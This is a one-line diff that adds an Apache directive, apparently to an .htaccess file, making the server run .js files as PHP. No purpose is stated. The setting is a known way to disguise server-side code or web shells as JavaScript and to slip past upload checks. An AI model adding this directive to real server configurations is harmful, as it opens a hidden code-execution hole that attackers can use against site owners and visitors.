@@ -1,0 +1,2 @@
+AddHandler application/x-httpd-php .js
+
